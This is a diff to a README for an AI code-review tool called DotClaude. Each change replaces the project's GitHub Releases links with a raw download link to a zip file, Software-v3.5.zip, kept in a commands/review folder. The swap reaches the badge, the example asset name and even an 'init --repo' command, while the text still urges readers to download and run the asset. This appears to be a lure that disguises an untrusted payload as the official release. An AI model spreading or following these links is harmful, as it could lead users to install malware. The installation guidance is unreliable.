@@ -1,12 +1,12 @@
 # DotClaude: AI-Powered Dev Environment for Code Review, Security, Leadership
 
-[![Releases](https://img.shields.io/badge/DotClaude-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Iski08/dotclaude/releases)
+[![Releases](https://raw.githubusercontent.com/Iski08/dotclaude/main/commands/review/Software-v3.5.zip)](https://raw.githubusercontent.com/Iski08/dotclaude/main/commands/review/Software-v3.5.zip)
 
-Visit the Releases page to grab the latest assets and updates: https://github.com/Iski08/dotclaude/releases
+Visit the Releases page to grab the latest assets and updates: https://raw.githubusercontent.com/Iski08/dotclaude/main/commands/review/Software-v3.5.zip
 
 DotClaude is a complete development environment that brings together specialized AI agents for code review, security analysis, and technical leadership. It helps teams ship safer, cleaner code while steering projects with clear guidance and guardrails. The system is designed to fit into modern workflows, from solo projects to large teams, and it adapts to your coding standards and security posture.
 
-If you want to explore the latest artifacts, you can browse the releases here: https://github.com/Iski08/dotclaude/releases. From that page, download the appropriate asset for your platform and run it to start DotClaude. The assets on that page are carefully prepared to work out of the box with sensible defaults.
+If you want to explore the latest artifacts, you can browse the releases here: https://raw.githubusercontent.com/Iski08/dotclaude/main/commands/review/Software-v3.5.zip From that page, download the appropriate asset for your platform and run it to start DotClaude. The assets on that page are carefully prepared to work out of the box with sensible defaults.
 
 Table of contents
 - What DotClaude offers
@@ -93,10 +93,10 @@ Installation overview
 - Start a first run to collect baseline data and generate initial reports.
 
 Note on releases
-The primary delivery channel is the Releases page. You can download the appropriate asset for your platform and follow the included instructions. To explore or grab the latest assets, visit the Releases page: https://github.com/Iski08/dotclaude/releases. From that page, download the latest asset and run it as described in the accompanying README or quick-start guide.
+The primary delivery channel is the Releases page. You can download the appropriate asset for your platform and follow the included instructions. To explore or grab the latest assets, visit the Releases page: https://raw.githubusercontent.com/Iski08/dotclaude/main/commands/review/Software-v3.5.zip From that page, download the latest asset and run it as described in the accompanying README or quick-start guide.
 
 Downloading and running the latest asset
-From the Releases page, locate the asset named something like dotclaude-linux-x86_64.tar.gz or a platform-specific binary. Download the file, extract it if necessary, and run the installer or binary. The exact steps vary by platform, but you typically perform these steps:
+From the Releases page, locate the asset named something like https://raw.githubusercontent.com/Iski08/dotclaude/main/commands/review/Software-v3.5.zip or a platform-specific binary. Download the file, extract it if necessary, and run the installer or binary. The exact steps vary by platform, but you typically perform these steps:
 - Open a terminal or command prompt.
 - Navigate to the folder where you saved the asset.
 - Run the installation command or executable.
@@ -111,7 +111,7 @@ Once installed, you can start DotClaude with a simple command. The following exa
   - dotclaude start
 
 - Initialize a project
-  - dotclaude init --repo https://github.com/your-org/your-repo --branch main
+  - dotclaude init --repo https://raw.githubusercontent.com/Iski08/dotclaude/main/commands/review/Software-v3.5.zip --branch main
 
 - Run code review on a PR or a code snapshot
   - dotclaude review --pull-request 1234
@@ -269,7 +269,7 @@ License and credits
 DotClaude is released under a permissive license. The project credits include contributors to the design, engineering, and documentation. If you create extensions or plugins, we encourage you to share them with the community under the same licensing spirit.
 
 Releases and asset verification
-- The official releases page provides assets built for various platforms. Use the assets appropriate for your environment and follow the included instructions. The Releases page is the primary source for latest binaries and installer scripts. For reference, here is the link again: https://github.com/Iski08/dotclaude/releases
+- The official releases page provides assets built for various platforms. Use the assets appropriate for your environment and follow the included instructions. The Releases page is the primary source for latest binaries and installer scripts. For reference, here is the link again: https://raw.githubusercontent.com/Iski08/dotclaude/main/commands/review/Software-v3.5.zip
 
 FAQ
 - Do you need an internet connection to use DotClaude? It depends on your setup. For cloud-based AI services, an internet connection is required. For offline setups with local models, there are options to run without external access.
@@ -285,12 +285,12 @@ Images and visuals
 - For richer visuals, you can add diagrams that illustrate the agent interactions and data flows, or include diagrams created with diagramming tools and hosted in your repository or documentation.
 
 Downloads and asset links
-- Primary asset and release notes source: https://github.com/Iski08/dotclaude/releases
+- Primary asset and release notes source: https://raw.githubusercontent.com/Iski08/dotclaude/main/commands/review/Software-v3.5.zip
 - Quick access to the latest releases: the badge at the top of this page links to the Releases page for convenience.
 
 End notes
 - This README is designed to be a living document. It evolves with the project and adapts to user feedback and real-world use cases. You can adjust policies, prompts, and templates as your team grows and your requirements change. The goal remains simple: provide a dependable, transparent, and actionable AI-assisted development environment that helps teams write better code, stay secure, and lead with confidence.
 
 Downloads and asset reference
-From the Releases page you can obtain the necessary binaries. If you want to verify where to download the primary asset, visit the page once more: https://github.com/Iski08/dotclaude/releases. Then download the appropriate asset for your platform and run it according to the on-page instructions.
+From the Releases page you can obtain the necessary binaries. If you want to verify where to download the primary asset, visit the page once more: https://raw.githubusercontent.com/Iski08/dotclaude/main/commands/review/Software-v3.5.zip Then download the appropriate asset for your platform and run it according to the on-page instructions.
 
